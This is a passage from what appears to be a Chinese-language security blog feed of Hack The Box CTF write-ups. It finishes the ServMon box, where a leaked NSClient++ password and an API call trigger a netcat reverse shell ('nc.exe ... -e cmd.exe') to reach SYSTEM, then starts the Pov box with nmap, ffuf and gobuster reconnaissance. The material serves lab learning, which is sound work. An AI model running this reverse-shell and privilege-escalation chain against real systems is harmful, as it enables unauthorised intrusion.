+</span></span><span style="display:flex;"><span>11/11/2019  07:52 PM    &lt;DIR&gt;          internet explorer
+</span></span><span style="display:flex;"><span>02/28/2022  07:07 PM    &lt;DIR&gt;          MSBuild
+</span></span><span style="display:flex;"><span>02/28/2022  07:55 PM    &lt;DIR&gt;          NSClient++
+</span></span><span style="display:flex;"><span>02/28/2022  07:46 PM    &lt;DIR&gt;          NVMS-1000
+</span></span><span style="display:flex;"><span>02/28/2022  07:32 PM    &lt;DIR&gt;          OpenSSH-Win64
+</span></span><span style="display:flex;"><span>02/28/2022  07:07 PM    &lt;DIR&gt;          Reference Assemblies
+</span></span><span style="display:flex;"><span>02/28/2022  06:44 PM    &lt;DIR&gt;          VMware
+</span></span><span style="display:flex;"><span>11/11/2019  07:52 PM    &lt;DIR&gt;          Windows Defender
+</span></span><span style="display:flex;"><span>11/11/2019  07:52 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
+</span></span><span style="display:flex;"><span>09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Mail
+</span></span><span style="display:flex;"><span>11/11/2019  07:52 PM    &lt;DIR&gt;          Windows Media Player
+</span></span><span style="display:flex;"><span>09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Multimedia Platform
+</span></span><span style="display:flex;"><span>09/15/2018  12:28 AM    &lt;DIR&gt;          windows nt
+</span></span><span style="display:flex;"><span>11/11/2019  07:52 PM    &lt;DIR&gt;          Windows Photo Viewer
+</span></span><span style="display:flex;"><span>09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Portable Devices
+</span></span><span style="display:flex;"><span>09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Security
+</span></span><span style="display:flex;"><span>02/28/2022  07:25 PM    &lt;DIR&gt;          WindowsPowerShell
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">0</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>              <span style="color:#ae81ff">0</span> bytes
+</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">20</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   6,107,136,000 bytes free
+</span></span></code></pre></div><p>查看 <code>nsclient.ini</code> 文件发现靶机在 127.0.0.1 下的服务密码为 <code>ew2x6SsGTxjRwXOT</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nadine@SERVMON C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\N</span>SClient++&gt;type nsclient.ini                                                                                                                                                      
+</span></span><span style="display:flex;"><span>ï»¿# If you want to fill this file with all available options run the following command:                                                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   nscp settings --generate --add-defaults --load-all                                                                                                                                                            </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If you want to activate a module and bring in all its options use:                                                         </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults                                                             </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For details run: nscp settings --help             </span>
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>; in flight - TODO                                                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/settings/default<span style="color:#f92672">]</span>                                           
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                           
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> ew2x6SsGTxjRwXOT                                                                                                                                                         
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                           
+</span></span><span style="display:flex;"><span>allowed hosts <span style="color:#f92672">=</span> 127.0.0.1                                                                                                                                                           
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>                                                                                         
+</span></span><span style="display:flex;"><span>; in flight - TODO                                                                                                                                                                                                                                                                                                                                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/settings/NRPE/server<span style="color:#f92672">]</span>                                                                                                                    
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>; Undocumented key                                                   
+</span></span><span style="display:flex;"><span>ssl options <span style="color:#f92672">=</span> no-sslv2,no-sslv3                                                                                                                                                                                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                                                            
+</span></span><span style="display:flex;"><span>; Undocumented key                                                            
+</span></span><span style="display:flex;"><span>verify mode <span style="color:#f92672">=</span> peer-cert                                                                                                                                       
+</span></span><span style="display:flex;"><span>                                                                                                                                                            
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                                                          
+</span></span><span style="display:flex;"><span>insecure <span style="color:#f92672">=</span> false                                                                                                                                              
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>; in flight - TODO                                                                                                                                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/modules<span style="color:#f92672">]</span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                                                                                
+</span></span><span style="display:flex;"><span>CheckHelpers <span style="color:#f92672">=</span> disabled                                                                  
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                        
+</span></span><span style="display:flex;"><span>CheckEventLog <span style="color:#f92672">=</span> disabled                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>CheckNSCP <span style="color:#f92672">=</span> disabled                                                                                     
+</span></span><span style="display:flex;"><span>                                                                                                         
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>CheckDisk <span style="color:#f92672">=</span> disabled                                                                                     
+</span></span><span style="display:flex;"><span>                                                                                                         
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>CheckSystem <span style="color:#f92672">=</span> disabled                                                                                                                                                            
+</span></span><span style="display:flex;"><span>                                                                                                         
+</span></span><span style="display:flex;"><span>; Undocumented key                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>WEBServer <span style="color:#f92672">=</span> enabled                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>; Undocumented key                                            
+</span></span><span style="display:flex;"><span>NRPEServer <span style="color:#f92672">=</span> enabled                                          
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>; CheckTaskSched - Check status of your scheduled jobs.                                                                      
+</span></span><span style="display:flex;"><span>CheckTaskSched <span style="color:#f92672">=</span> enabled                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Scheduler - Use this to schedule check commands and jobs in conjunction with <span style="color:#66d9ef">for</span> instance passive monitoring through NSCA 
+</span></span><span style="display:flex;"><span>Scheduler <span style="color:#f92672">=</span> enabled            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; CheckExternalScripts - Module used to execute external scripts                                                             
+</span></span><span style="display:flex;"><span>CheckExternalScripts <span style="color:#f92672">=</span> enabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Script wrappings - A list of templates <span style="color:#66d9ef">for</span> defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the
+</span></span><span style="display:flex;"><span> actual script an %ARGS% will be replaced by any given arguments.                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/settings/external scripts/wrappings<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Batch file - Command used <span style="color:#66d9ef">for</span> executing wrapped batch files                                                                
+</span></span><span style="display:flex;"><span>bat <span style="color:#f92672">=</span> scripts<span style="color:#ae81ff">\\</span>%SCRIPT% %ARGS%                                
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Visual basic script - Command line used <span style="color:#66d9ef">for</span> wrapped vbs scripts                                                            
+</span></span><span style="display:flex;"><span>vbs <span style="color:#f92672">=</span> cscript.exe //T:30 //NoLogo scripts<span style="color:#ae81ff">\\</span>lib<span style="color:#ae81ff">\\</span>wrapper.vbs %SCRIPT% %ARGS%                                                  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; POWERSHELL WRAPPING - Command line used <span style="color:#66d9ef">for</span> executing wrapped ps1 <span style="color:#f92672">(</span>powershell<span style="color:#f92672">)</span> scripts                                     
+</span></span><span style="display:flex;"><span>ps1 <span style="color:#f92672">=</span> cmd /c echo If <span style="color:#f92672">(</span>-Not <span style="color:#f92672">(</span>Test-Path <span style="color:#e6db74">&#34;scripts\%SCRIPT%&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">)</span> <span style="color:#f92672">{</span> Write-Host <span style="color:#e6db74">&#34;UNKNOWN: Script `&#34;</span>%SCRIPT%<span style="color:#e6db74">`</span><span style="color:#e6db74">&#34; not found.&#34;</span>; exit<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> <span style="color:#f92672">}</span>; scripts<span style="color:#ae81ff">\%</span>SCRIPT% $ARGS$; exit<span style="color:#f92672">(</span>$lastexitcode<span style="color:#f92672">)</span> | powershell.exe /noprofile -command -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: <span style="color:#e6db74">`</span>command<span style="color:#f92672">=</span>script arguments<span style="color:#e6db74">`</span>                                                                                                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/settings/external scripts/scripts<span style="color:#f92672">]</span>                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Schedules - Section <span style="color:#66d9ef">for</span> the Scheduler module.               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/settings/scheduler/schedules<span style="color:#f92672">]</span>                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Undocumented key                                            
+</span></span><span style="display:flex;"><span>foobar <span style="color:#f92672">=</span> command <span style="color:#f92672">=</span> foobar                                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; External script settings - General settings <span style="color:#66d9ef">for</span> the external scripts module <span style="color:#f92672">(</span>CheckExternalScripts<span style="color:#f92672">)</span>.                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/settings/external scripts<span style="color:#f92672">]</span>                                  
+</span></span><span style="display:flex;"><span>allow arguments <span style="color:#f92672">=</span> true
+</span></span></code></pre></div><p>在靶机中创建一个自定义目录，在其中放入 nc.exe 与 恶意文件 enil.bat</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-enil.bat" data-lang="enil.bat"><span style="display:flex;"><span>@<span style="color:#66d9ef">echo</span> off
+</span></span><span style="display:flex;"><span>C:\Programdata\app\nc.exe<span style="color:#75715e"> 10.10.16.58 4444 -e cmd.exe</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nadine@SERVMON c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pp&gt;dir 
+</span></span><span style="display:flex;"><span> Volume in drive C has no label. 
+</span></span><span style="display:flex;"><span> Volume Serial Number is 20C1-47A1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/11/2026  08:08 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/11/2026  08:08 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>03/11/2026  07:38 PM                <span style="color:#ae81ff">64</span> enil.bat
+</span></span><span style="display:flex;"><span>03/11/2026  07:37 PM            45,272 nc.exe
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         90,608 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   6,100,402,176 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nadine@SERVMON c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pp&gt;Read from remote host 10.129.227.77: Connection timed out
+</span></span><span style="display:flex;"><span>Connection to 10.129.227.77 closed.
+</span></span><span style="display:flex;"><span>client_loop: send disconnect: Broken pipe
+</span></span></code></pre></div><p>在 Kali 中通过 SSH 做本地端口转发</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
+</span></span></code></pre></div><p>启动监听，触发恶意脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -k -u admin:ew2x6SsGTxjRwXOT <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;https://127.0.0.1:8443/api/v1/queries/enil/commands/execute?time=3m&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;command&#34;</span>:<span style="color:#e6db74">&#34;enil&#34;</span>,<span style="color:#e6db74">&#34;lines&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Command enil didn&#39;t terminate within the timeout period 60s&#34;</span>,<span style="color:#e6db74">&#34;perf&#34;</span>:<span style="color:#f92672">{}}]</span>,<span style="color:#e6db74">&#34;result&#34;</span>:3<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>获得 <code>nt authority\system</code> 权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>type root.txt
+</span></span><span style="display:flex;"><span>e136a4************1cfdc3fa4ae2e0
+</span></span></code></pre></div>]]></content></item><item><title>HTB-Pov Writeup</title><link>https://enilmalus.github.io/posts/htb-pov-writeup/</link><pubDate>Sat, 07 Mar 2026 15:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-pov-writeup/</guid><description>初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.230.183 [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 02:45 EST Nmap scan report for 10.129.230.183 Host is up (0.11s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds 靶机只开放了一个 TCP 端口 80。
+Nmap 详细信息扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap -sT -sC -sV -O -p80 10.</description><content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.230.183 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-07 02:45 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.183
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.77 seconds
+</span></span></code></pre></div><p>靶机只开放了一个 TCP 端口 80。</p>
+<h3 id="nmap-详细信息扫描">Nmap 详细信息扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p80 10.129.230.183               
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-07 02:46 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.183
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.10s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: pov.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2019|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> - 21H1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.49 seconds
+</span></span></code></pre></div><p>80 端口暴露了域名 <code>pov.htb</code>，添加进 hosts。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.230.183 pov.htb&#34; &gt;&gt; /etc/hosts&#39;</span> 
+</span></span><span style="display:flex;"><span>                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.230.183 pov.htb
+</span></span></code></pre></div><h2 id="web-80-端口渗透">Web-80 端口渗透</h2>
+<p>访问 80 端口。</p>
+<p><img src="Pasted%20image%2020260307154901.png" alt=""></p>
+<p><img src="Pasted%20image%2020260307154953.png" alt=""></p>
+<p>简单浏览发现网页暴露出了子域名 <code>dev.pov.htb</code> 和电子邮件 <code>sfitz.pov.htb</code>，进行更详细的子域名爆破。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo ffuf -H <span style="color:#e6db74">&#34;Host: FUZZ.pov.htb&#34;</span> -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://pov.htb
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span style="display:flex;"><span> :: Header           : Host: FUZZ.pov.htb
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : true
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dev                     <span style="color:#f92672">[</span>Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 99ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>4989/4989<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">408</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:18<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><p>粗略爆破只发现这一个子域名，补充进 hosts 。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.230.183 pov.htb dev.pov.htb
+</span></span></code></pre></div><p>获取网站请求头发现使用的技术栈是 <code>asp.net</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -I http://pov.htb
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">12330</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html
+</span></span><span style="display:flex;"><span>Last-Modified: Thu, <span style="color:#ae81ff">11</span> Jan <span style="color:#ae81ff">2024</span> 15:08:44 GMT
+</span></span><span style="display:flex;"><span>Accept-Ranges: bytes
+</span></span><span style="display:flex;"><span>ETag: <span style="color:#e6db74">&#34;9f75a811a044da1:0&#34;</span>
+</span></span><span style="display:flex;"><span>Server: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>X-Powered-By: ASP.NET
+</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">07</span> Mar <span style="color:#ae81ff">2026</span> 07:58:59 GMT
+</span></span></code></pre></div><p>暂时放弃，查看子域名的界面。访问 <code>dev.pov.htb</code> 自动重定向至 <code>/portfolio/defualt.aspx</code> 界面，进行更详细的目录爆破。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                           
+</span></span><span style="display:flex;"><span>└─$ sudo gobuster dir -u http://dev.pov.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.
+</span></span><span style="display:flex;"><span>txt --exclude-length 188                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://dev.pov.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
